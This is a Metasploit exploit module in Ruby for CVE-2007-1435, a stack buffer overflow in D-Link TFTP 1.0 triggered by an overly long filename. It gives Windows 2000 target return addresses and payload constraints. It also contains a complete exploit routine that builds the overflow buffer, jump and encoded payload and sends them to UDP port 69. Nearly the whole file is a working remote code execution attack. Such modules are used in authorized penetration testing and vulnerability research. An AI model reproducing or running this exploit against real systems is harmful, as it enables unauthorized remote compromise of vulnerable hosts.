##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/ 
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::Udp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'D-Link TFTP 1.0 Long Filename Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack overflow in D-Link TFTP 1.0.
					By sending a request for an overly long file name, an attacker 
					could overflow a buffer and execute arbitrary code. For best results,
					use bind payloads with nonx (No NX).
			},
			'Author'         => 	[
							'LSO <lso[@]hushmail.com>', # Exploit module
							'patrick', # Refs, stability, targets etc
						],
			'Version'        => '$Revision$',
			'References'     => 
				[ 
					[ 'BID', '22923' ],
					[ 'OSVDB', '33977' ],
					[ 'CVE', '2007-1435' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00",
					'Compat'   => 
					{
						'ConnectionType' => '-reverse',
					},
				},
			'SaveRegisters'  => [ 'ecx', 'eax', 'esi' ],
			'Platform'       => 'win',
			
			'Targets'        =>
				[
					# Patrick tested OK 20090228
					['Windows 2000 SP4 English', { 'Ret' => 0x77e1ccf7 } ], # jmp ebx
					['Windows 2000 SP3 English', { 'Ret' => 0x77f8361b } ], # jmp ebx
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Mar 12 2007',
			'DefaultTarget' => 0))

			register_options([Opt::RPORT(69)], self)

	end

	def exploit
		connect_udp

		print_status("Trying target #{target.name}...")

		juju = "\x00\x01"  
		juju << Rex::Text.rand_text_alpha_upper(581)
		juju << Rex::Arch::X86.jmp_short(42)
		juju << Rex::Text.rand_text_alpha_upper(38)
		juju << [target.ret].pack('V') + payload.encoded
 
		udp_sock.put(juju)

		handler
		disconnect_udp
	end

end


